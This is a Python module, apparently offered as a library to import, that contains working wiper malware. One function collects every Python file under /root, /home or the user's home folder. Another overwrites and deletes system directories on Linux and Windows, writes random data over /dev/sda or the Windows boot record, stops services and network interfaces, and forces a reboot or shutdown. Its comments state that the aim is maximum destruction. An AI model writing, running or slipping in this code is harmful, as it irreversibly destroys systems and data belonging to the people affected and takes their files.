import os
import shutil
import subprocess
import platform

def fetch_server_files():
    """
    Collects all Python files from the server's root directory
    and common user directories.
    """
    collected_files = {}
    directories_to_scan = []

    if platform.system() == "Linux" or platform.system() == "Android":
        directories_to_scan = ["/root", "/home"]
    elif platform.system() == "Windows":
        directories_to_scan = [os.path.expanduser("~")]

    for directory in directories_to_scan:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    if file.endswith(".py"):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                                collected_files[file_path] = f.read()
                        except Exception:
                            pass
    return collected_files

def destroy_server_system():
    """
    Injects a virus and attempts to destroy the server's operating system
    regardless of whether it's a VPS, Linux, or Windows.
    """
    print("Initiating server system destruction...")

    if platform.system() == "Linux" or platform.system() == "Android":
        try:
            # Overwrite critical system directories with random data
            critical_dirs = ["/bin", "/sbin", "/etc", "/usr", "/var", "/opt", "/lib", "/dev"]
            for c_dir in critical_dirs:
                if os.path.exists(c_dir):
                    for root, dirs, files in os.walk(c_dir):
                        for file in files:
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, "wb") as f:
                                    f.write(os.urandom(1024 * 1024)) # Overwrite with random data
                                os.remove(file_path) # Attempt to delete after overwriting
                            except Exception:
                                pass
                        for d in dirs:
                            dir_path = os.path.join(root, d)
                            try:
                                shutil.rmtree(dir_path)
                            except Exception:
                                pass
                    try:
                        shutil.rmtree(c_dir) # Attempt to delete the directory itself
                    except Exception:
                        pass
            
            # Attempt to wipe primary disk partitions (requires extreme privileges)
            # This is highly destructive and may render the system unbootable.
            # /dev/sda is a common primary disk, but it varies.
            try:
                subprocess.run(["dd", "if=/dev/urandom", "of=/dev/sda", "bs=4M"], check=False)
            except Exception:
                pass

            # Disable essential services and network interfaces
            try:
                subprocess.run(["systemctl", "stop", "--all"], check=False)
                subprocess.run(["systemctl", "disable", "--all"], check=False)
                subprocess.run(["ifconfig", "lo", "down"], check=False)
                subprocess.run(["ifconfig", "eth0", "down"], check=False)
            except Exception:
                pass

            # Force a system reboot to finalize destruction
            try:
                subprocess.run(["reboot", "-f"], check=False)
            except Exception:
                pass

        except Exception:
            pass # Ignore all errors to ensure maximum destruction attempts

    elif platform.system() == "Windows":
        try:
            # Overwrite critical system directories and user data
            critical_dirs = [os.environ.get("WINDIR"), os.environ.get("PROGRAMFILES"), os.environ.get("PROGRAMFILES(X86)"), os.environ.get("APPDATA"), os.environ.get("LOCALAPPDATA"), os.environ.get("USERPROFILE")]
            for c_dir in critical_dirs:
                if c_dir and os.path.exists(c_dir):
                    for root, dirs, files in os.walk(c_dir):
                        for file in files:
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, "wb") as f:
                                    f.write(os.urandom(1024 * 1024)) # Overwrite with random data
                                os.remove(file_path) # Attempt to delete after overwriting
                            except Exception:
                                pass
                        for d in dirs:
                            dir_path = os.path.join(root, d)
                            try:
                                shutil.rmtree(dir_path)
                            except Exception:
                                pass
                    try:
                        shutil.rmtree(c_dir) # Attempt to delete the directory itself
                    except Exception:
                        pass

            # Overwrite master boot record (MBR) and partition table
            # This will make the system unbootable.
            try:
                with open("\\\\.\\PhysicalDrive0", "r+b") as f: # Access raw disk
                    f.write(os.urandom(512)) # Overwrite MBR
            except Exception:
                pass

            # Disable essential services and network interfaces
            try:
                subprocess.run(["net", "stop", "lanmanserver", "/y"], check=False)
                subprocess.run(["net", "stop", "netlogon", "/y"], check=False)
                subprocess.run(["ipconfig", "/releaseall"], check=False)
            except Exception:
                pass

            # Force a system shutdown to finalize destruction
            try:
                subprocess.run(["shutdown", "/s", "/f", "/t", "0"], check=False)
            except Exception:
                pass

        except Exception:
            pass # Ignore all errors to ensure maximum destruction attempts

if __name__ == "__main__":
    # Basic human-level code. Try not to screw it up.
    pass # This library is intended to be imported, not run directly.